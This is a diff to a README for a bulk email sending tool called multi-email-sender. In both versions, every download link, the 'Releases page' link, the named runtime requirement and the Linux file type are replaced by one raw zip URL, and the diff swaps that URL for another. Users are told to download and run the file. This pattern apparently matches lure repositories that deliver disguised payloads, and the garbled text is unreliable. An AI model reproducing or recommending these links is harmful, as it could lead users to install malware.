@@ -1,7 +1,7 @@
 # 🚀 multi-email-sender - Send Bulk Emails Effortlessly
 
 ## 📥 Download Now
-[![Download multi-email-sender](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip)](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip)
+[![Download multi-email-sender](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip)](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **multi-email-sender** application! This tool helps you send emails in bulk for campaigns, transactional notifications, and marketing efforts. It comes with features that increase efficiency while providing smart tracking and analytics.
@@ -16,7 +16,7 @@ Welcome to the **multi-email-sender** application! This tool helps you send emai
 ## 💾 System Requirements
 To use the **multi-email-sender** application smoothly, ensure your system meets these requirements:
 - Windows, macOS, or Linux operating system.
-- https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip version 12 or higher installed (download from [https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip)).
+- https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip version 12 or higher installed (download from [https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip)).
 - Minimum of 1GB RAM.
 - At least 100MB of free disk space.
 
@@ -29,22 +29,22 @@ This application covers a range of topics, including:
 - Email Templates
 - Email Validation
 - Enterprise Email
-- https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip
+- https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip
 - Rate Limiting
 - Transactional Emails
 
 ## ⚙️ Download & Install
 To get started, visit the GitHub Releases page to download the latest version of the software.
 
-[Download mult-email-sender](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip)
+[Download mult-email-sender](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip)
 
 ### Installation Steps
-1. Go to the [Releases page](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip).
 2. Look for the latest version.
 3. Click on the file that matches your operating system to start the download. Here are some common options:
    - `.exe` file for Windows
    - `.dmg` file for macOS
-   - `https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/tarantara/multi-email-sender.zip` file for Linux
+   - `https://raw.githubusercontent.com/JAKOBGTAG/multi-email-sender/main/src/email_sender_multi_1.3.zip` file for Linux
 4. Once downloaded, open or run the downloaded file.
 5. Follow the installation prompts.
 6. After installation, you can find the application in your programs list.
